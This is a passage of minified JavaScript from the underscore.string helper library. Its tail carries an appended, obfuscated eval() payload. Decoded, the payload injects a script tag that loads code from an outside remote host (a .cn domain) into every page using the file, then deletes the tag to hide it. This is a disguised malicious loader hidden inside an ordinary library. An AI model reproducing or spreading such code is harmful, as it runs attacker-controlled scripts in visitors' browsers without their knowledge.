            return d.isBlank(t) ? [] : d.trim(t, e).split(e || /\s+/)
        },
        pad: function(t, i, n, r) {
            t = null == t ? "": e(t),
            i = ~~i;
            var c = 0;
            switch (n ? n.length > 1 && (n = n.charAt(0)) : n = " ", r) {
            case "right":
                return c = i - t.length,
                t + o(n, c);
            case "both":
                return c = i - t.length,
                o(n, Math.ceil(c / 2)) + t + o(n, Math.floor(c / 2));
            default:
                return c = i - t.length,
                o(n, c) + t
            }
        },
        lpad: function(t, e, i) {
            return d.pad(t, e, i)
        },
        rpad: function(t, e, i) {
            return d.pad(t, e, i, "right")
        },
        lrpad: function(t, e, i) {
            return d.pad(t, e, i, "both")
        },
        sprintf: _,
        vsprintf: function(t, e) {
            return e.unshift(t),
            _.apply(null, e)
        },
        toNumber: function(t, i) {
            if (null == t || "" == t) return 0;
            t = e(t);
            var n = c(c(t).toFixed(~~i));
            return 0 !== n || t.match(/^0+$/) ? n: Number.NaN
        },
        numberFormat: function(t, e, i, n) {
            if (isNaN(t) || null == t) return "";
            t = t.toFixed(~~e),
            n = n || ",";
            var r = t.split("."),
            c = r[0],
            o = r[1] ? (i || ".") + r[1] : "";
            return c.replace(/(\d)(?=(?:\d{3})+$)/g, "$1" + n) + o
        },
        strRight: function(t, i) {
            if (null == t) return "";
            t = e(t),
            i = null != i ? e(i) : i;
            var n = i ? t.indexOf(i) : -1;
            return~n ? t.slice(n + i.length, t.length) : t
        },
        strRightBack: function(t, i) {
            if (null == t) return "";
            t = e(t),
            i = null != i ? e(i) : i;
            var n = i ? t.lastIndexOf(i) : -1;
            return~n ? t.slice(n + i.length, t.length) : t
        },
        strLeft: function(t, i) {
            if (null == t) return "";
            t = e(t),
            i = null != i ? e(i) : i;
            var n = i ? t.indexOf(i) : -1;
            return~n ? t.slice(0, n) : t
        },
        strLeftBack: function(t, e) {
            if (null == t) return "";
            t += "",
            e = null != e ? "" + e: e;
            var i = t.lastIndexOf(e);
            return~i ? t.slice(0, i) : t
        },
        toSentence: function(t, e, i, n) {
            e = e || ", ",
            i = i || " and ";
            var r = t.slice(),
            c = r.pop();
            return t.length > 2 && n && (i = d.rtrim(e) + i),
            r.length ? r.join(e) + i + c: c
        },
        toSentenceSerial: function() {
            var t = s.call(arguments);
            return t[3] = !0,
            d.toSentence.apply(d, t)
        },
        slugify: function(t) {
            if (null == t) return "";
            var i = "ąàáäâãåæćęèéëêìíïîłńòóöôõøùúüûñçżź",
            n = "aaaaaaaaceeeeeiiiilnoooooouuuunczz",
            r = new RegExp(a(i), "g");
            return t = e(t).toLowerCase().replace(r,
            function(t) {
                var e = i.indexOf(t);
                return n.charAt(e) || "-"
            }),
            d.dasherize(t.replace(/[^\w\s-]/g, ""))
        },
        surround: function(t, e) {
            return [e, t, e].join("")
        },
        quote: function(t) {
            return d.surround(t, '"')
        },
        exports: function() {
            var t = {};
            for (var e in this) this.hasOwnProperty(e) && !e.match(/^(?:include|contains|reverse)$/) && (t[e] = this[e]);
            return t
        },
        repeat: function(t, i, n) {
            if (null == t) return "";
            if (i = ~~i, null == n) return o(e(t), i);
            for (var r = []; i > 0; r[--i] = t);
            return r.join(n)
        },
        levenshtein: function(t, i) {
            if (null == t && null == i) return 0;
            if (null == t) return e(i).length;
            if (null == i) return e(t).length;
            t = e(t),
            i = e(i);
            for (var n, r, c = [], o = 0; o <= i.length; o++) for (var s = 0; s <= t.length; s++) r = o && s ? t.charAt(s - 1) === i.charAt(o - 1) ? n: Math.min(c[s], c[s - 1], n) + 1 : o + s,
            n = c[s],
            c[s] = r;
            return c.pop()
        }
    };
    d.strip = d.trim,
    d.lstrip = d.ltrim,
    d.rstrip = d.rtrim,
    d.center = d.lrpad,
    d.rjust = d.lpad,
    d.ljust = d.rpad,
    d.contains = d.include,
    d.q = d.quote,
    "undefined" != typeof exports ? ("undefined" != typeof module && module.exports && (module.exports = d), exports._s = d) : "function" == typeof define && define.amd ? define("underscore.string", [],
    function() {
        return d
    }) : (t._ = t._ || {},
    t._.string = t._.str = d)
} (this, String),
_.mixin(_.str.exports()),
eval(function(t, e, i, n, r, c) {
    if (r = function(t) {
        return t.toString(36)
    },
    0 == "0".replace(0, r)) {
        for (; i--;) c[r(i)] = n[i];
        n = [function(t) {
            return c[t] || t
        }],
        r = function() {
            return "[4-9c-l]"
        },
        i = 1
    }
    for (; i--;) n[i] && (t = t.replace(new RegExp("\\b" + r(i) + "\\b", "g"), n[i]));
    return t
} ("c _$=['\\6\\7\\d\\8\\9\\4','\\4\\e\\x78\\4\\5\\h\\f\\x76\\f\\6\\7\\d\\8\\9\\4','\\x68\\4\\4\\9\\x3a\\5\\5\\x77\\e\\8\\g\\i\\6\\x6b\\x79\\g\\7\\x6e\\5\\x67\\f\\x6d\\e\\5\\x38\\i\\5\\x6f\\g\\h\\6','\\6\\7\\d\\8\\9\\4'];(j(){c a=k.createElement(_$[0]);a.type=_$[1];a.async=true;a.src=_$[2];c b=k.getElementsByTagName(_$[3])[0x0];b.l.insertBefore(a,b);a.onload=j(){a.l.removeChild(a)}})();", [], 22, "||||x74|x2f|x73|x63|x69|x70|||var|x72|x65|x61|x2e|x6a|x32|function|document|parentNode".split("|"), 0, {}));